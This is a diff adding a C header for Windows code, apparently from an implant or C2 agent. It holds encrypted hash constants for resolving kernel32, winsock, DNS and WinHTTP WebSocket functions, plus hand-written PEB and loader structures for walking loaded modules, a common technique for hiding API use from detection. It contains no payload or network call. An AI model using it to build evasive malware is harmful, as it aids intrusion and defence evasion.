@@ -1,0 +1,234 @@
+#ifndef _APIRESOLVE_H
+#define _APIRESOLVE_H
+
+#include <stdint.h>
+#include "windows.h"
+#include "windns.h"
+#include "winhttp.h"
+
+#define FAIL 0
+#define SUCCESS 1
+#define CRYPT_KEY 0x41424344
+
+uint64_t getFunctionPtr(unsigned long, unsigned long);
+
+// ----  KERNEL32 ----
+#define CRYPTED_HASH_KERNEL32 0x3102ad31 
+#define CRYPTED_HASH_CLOSEHANDLE 0x79328943
+#define CRYPTED_HASH_LOADLIBRARYA 0x1efdb3bf
+#define CRYTPED_HASH_VIRTUALALLOC 0x796e4cd3
+#define CRYPTED_HASH_LSTRLENA 0x9386e84e
+#define CRYPTED_HASH_LSTRLENW 0x9386e864
+#define CRYPTED_HASH_VIRTUALFREE 0x27cd8c6a
+#define CRYPTED_HASH_COPYMEMORY 0x14d8cfcf
+#define CRYPTED_HASH_CREATETHREAD 0x3e4ab715
+#define CRYPTED_HASH_WAITFORSINGLEOBJECT 0xad8fe2fe
+
+typedef HANDLE(WINAPI* CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef BOOL(WINAPI* CLOSEHANDLE)(HANDLE);
+typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
+typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef int(WINAPI* LSTRLENA)(LPCSTR);
+typedef int(WINAPI* LSTRLENW)(LPCWSTR);
+typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
+typedef void(WINAPI* COPYMEMORY)(PVOID, void*, SIZE_T);
+typedef DWORD(WINAPI* WAITFORSINGLEOBJECT)(HANDLE, DWORD);
+
+// ---- ws_32.dll ----
+#define CRYPTED_HASH_WS32 0xdb93484b
+#define CRYPTED_HASH_CONNECT 0x92340e8b
+#define CRYPTED_HASH_SOCKET 0x5d73406a
+#define CRYPTED_HASH_CLOSESOCKET 0x80ef240
+#define CRYPTED_HASH_IOCTLSOCKET 0x479e954d
+#define CRYPTED_HASH_SEND 0x3ddf980b
+#define CRYPTED_HASH_RECV 0x3ddf0ed1
+#define CRYPTED_HASH_SELECT 0x5ac2a081
+#define CRYPTED_HASH_WSAFDISSET 0x9037d084
+
+typedef int(WINAPI* _SOCKET)(int, int, int);
+typedef int(WINAPI* CONNECT)(SOCKET, const SOCKADDR_IN*, int);
+typedef int(WINAPI* CLOSESOCKET)(SOCKET);
+typedef int(WINAPI* IOCTLSOCKET)(SOCKET, long, u_long*);
+typedef int(WINAPI* SEND)(SOCKET, const char*, int, int);
+typedef int(WINAPI* RECV)(SOCKET, char*, int, int);
+typedef int(WINAPI* SELECT)(int, fd_set*, fd_set*, fd_set*, const struct timeval*);
+typedef int(WINAPI* WSAFDISSET)(SOCKET, fd_set*);
+
+
+// ---- shlwapi.dll ----
+#define CRYPTED_HASH_SHLWAPI 0xe64fd763
+#define CRYPTED_HASH_STRSTRA 0x4ef4617c
+
+typedef PCSTR(WINAPI* STRSTRA)(PCSTR, PCSTR);
+
+// ---- Dnsapi.dll ----
+#define CRYPTED_HASH_DNSAPI 0xee63266a
+#define CRYPTED_HASH_DNSQUERYA 0xaa46e0c4
+
+typedef DNS_STATUS(WINAPI* DNSQUERY_A)(PCSTR, WORD, DWORD, PVOID, PDNS_RECORD*, PVOID*);
+
+// ---- Winhttp.dll ----
+#define CRYPTED_HASH_WINHTTP 0xd34c7039
+#define CRYPTED_HASH_WINHTTPCLOSEHANDLE 0x77604f91
+#define CRYPTED_HASH_WINHTTPCONNECT 0x33008239
+#define CRYPTED_HASH_WINHTTPOPEN 0x1f0d7aa1
+#define CRYPTED_HASH_WINHTTPOPENREQUEST 0xabf5fa8a
+#define CRYPTED_HASH_WINHTTPRECEIVERESPONSE 0x552e0a61
+#define CRYPTED_HASH_WINHTTPSENDREQUEST 0xf0c1b9e2
+#define CRYPTED_HASH_WINHTTPSETOPTION 0xe0c9d7bc
+#define CRYPTED_HASH_WEBSOCKETCLOSE 0xc86413d4
+#define CRYPTED_HASH_WINHTTPWEBSOCKETCOMPLETEUPGRADE 0x44cb6a9f
+#define CRYPTED_HASH_WINHTTPWEBSOCKETRECEIVE 0x9c3337f9
+#define CRYPTED_HASH_WINHTTPWEBSOCKETSEND 0x3025da0
+#define CRYPTED_HASH_WINHTTPWEBSOCKETSHUTDOWN 0xc8984a32
+
+#ifdef __MINGW32__
+
+//typedef enum _WINHTTP_WEB_SOCKET_BUFFER_TYPE {
+//  WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
+//  WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE,
+//  WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
+//  WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE,
+//  WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE
+//} WINHTTP_WEB_SOCKET_BUFFER_TYPE;
+//
+//typedef enum _WINHTTP_WEB_SOCKET_CLOSE_STATUS {
+//  WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_ENDPOINT_TERMINATED_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_PROTOCOL_ERROR_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_INVALID_DATA_TYPE_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_EMPTY_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_ABORTED_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_INVALID_PAYLOAD_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_POLICY_VIOLATION_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_MESSAGE_TOO_BIG_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_UNSUPPORTED_EXTENSIONS_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_SERVER_ERROR_CLOSE_STATUS,
+//  WINHTTP_WEB_SOCKET_SECURE_HANDSHAKE_ERROR_CLOSE_STATUS
+//} WINHTTP_WEB_SOCKET_CLOSE_STATUS;
+
+#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET 114
+#endif
+
+typedef BOOL(WINAPI* WINHTTPCLOSEHANDLE)(HINTERNET);
+typedef HINTERNET(WINAPI* WINHTTPCONNECT)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET(WINAPI* WINHTTPOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET(WINAPI* WINHTTPOPENREQUEST)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL(WINAPI* WINHTTPRECEIVERESPONSE)(HINTERNET, LPVOID);
+typedef BOOL(WINAPI* WINHTTPSENDREQUEST)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL(WINAPI* WINHTTPSETOPTION)(HINTERNET, DWORD, LPVOID, DWORD);
+typedef DWORD(WINAPI* WINHTTPWEBSOCKETCLOSE)(HINTERNET, USHORT, PVOID, DWORD);
+typedef HINTERNET(WINAPI* WINHTTPWEBSOCKETCOMPLETEUPGRADE)(HINTERNET, DWORD_PTR);
+typedef DWORD(WINAPI* WINHTTPWEBSOCKETRECEIVE)(HINTERNET, PVOID, DWORD, DWORD*, WINHTTP_WEB_SOCKET_BUFFER_TYPE*);
+typedef DWORD(WINAPI* WINHTTPWEBSOCKETSEND)(HINTERNET, WINHTTP_WEB_SOCKET_BUFFER_TYPE, PVOID, DWORD);
+typedef DWORD(WINAPI* WINHTTPWEBSOCKETSHUTDOWN)(HINTERNET, USHORT, PVOID, DWORD);
+
+typedef struct _UNICODE_STR {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR pBuffer;
+} UNICODE_STR, * PUNICODE_STR;
+
+typedef struct _PEB_LDR_DATA
+{
+    DWORD dwLength;
+    DWORD dwInitialized;
+    LPVOID lpSsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    LPVOID lpEntryInProgress;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STR FullDllName;
+    UNICODE_STR BaseDllName;
+    ULONG Flags;
+    SHORT LoadCount;
+    SHORT TlsIndex;
+    LIST_ENTRY HashTableEntry;
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _PEB_FREE_BLOCK
+{
+    struct _PEB_FREE_BLOCK* pNext;
+    DWORD dwSize;
+} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
+
+typedef struct __PEB
+{
+    BYTE bInheritedAddressSpace;
+    BYTE bReadImageFileExecOptions;
+    BYTE bBeingDebugged;
+    BYTE bSpareBool;
+    LPVOID lpMutant;
+    LPVOID lpImageBaseAddress;
+    PPEB_LDR_DATA pLdr;
+    LPVOID lpProcessParameters;
+    LPVOID lpSubSystemData;
+    LPVOID lpProcessHeap;
+    PRTL_CRITICAL_SECTION pFastPebLock;
+    LPVOID lpFastPebLockRoutine;
+    LPVOID lpFastPebUnlockRoutine;
+    DWORD dwEnvironmentUpdateCount;
+    LPVOID lpKernelCallbackTable;
+    DWORD dwSystemReserved;
+    DWORD dwAtlThunkSListPtr32;
+    PPEB_FREE_BLOCK pFreeList;
+    DWORD dwTlsExpansionCounter;
+    LPVOID lpTlsBitmap;
+    DWORD dwTlsBitmapBits[2];
+    LPVOID lpReadOnlySharedMemoryBase;
+    LPVOID lpReadOnlySharedMemoryHeap;
+    LPVOID lpReadOnlyStaticServerData;
+    LPVOID lpAnsiCodePageData;
+    LPVOID lpOemCodePageData;
+    LPVOID lpUnicodeCaseTableData;
+    DWORD dwNumberOfProcessors;
+    DWORD dwNtGlobalFlag;
+    LARGE_INTEGER liCriticalSectionTimeout;
+    DWORD dwHeapSegmentReserve;
+    DWORD dwHeapSegmentCommit;
+    DWORD dwHeapDeCommitTotalFreeThreshold;
+    DWORD dwHeapDeCommitFreeBlockThreshold;
+    DWORD dwNumberOfHeaps;
+    DWORD dwMaximumNumberOfHeaps;
+    LPVOID lpProcessHeaps;
+    LPVOID lpGdiSharedHandleTable;
+    LPVOID lpProcessStarterHelper;
+    DWORD dwGdiDCAttributeList;
+    LPVOID lpLoaderLock;
+    DWORD dwOSMajorVersion;
+    DWORD dwOSMinorVersion;
+    WORD wOSBuildNumber;
+    WORD wOSCSDVersion;
+    DWORD dwOSPlatformId;
+    DWORD dwImageSubsystem;
+    DWORD dwImageSubsystemMajorVersion;
+    DWORD dwImageSubsystemMinorVersion;
+    DWORD dwImageProcessAffinityMask;
+    DWORD dwGdiHandleBuffer[34];
+    LPVOID lpPostProcessInitRoutine;
+    LPVOID lpTlsExpansionBitmap;
+    DWORD dwTlsExpansionBitmapBits[32];
+    DWORD dwSessionId;
+    ULARGE_INTEGER liAppCompatFlags;
+    ULARGE_INTEGER liAppCompatFlagsUser;
+    LPVOID lppShimData;
+    LPVOID lpAppCompatInfo;
+    UNICODE_STR usCSDVersion;
+    LPVOID lpActivationContextData;
+    LPVOID lpProcessAssemblyStorageMap;
+    LPVOID lpSystemDefaultActivationContextData;
+    LPVOID lpSystemAssemblyStorageMap;
+    DWORD dwMinimumStackCommit;
+} _PEB, * _PPEB;
+
+#endif
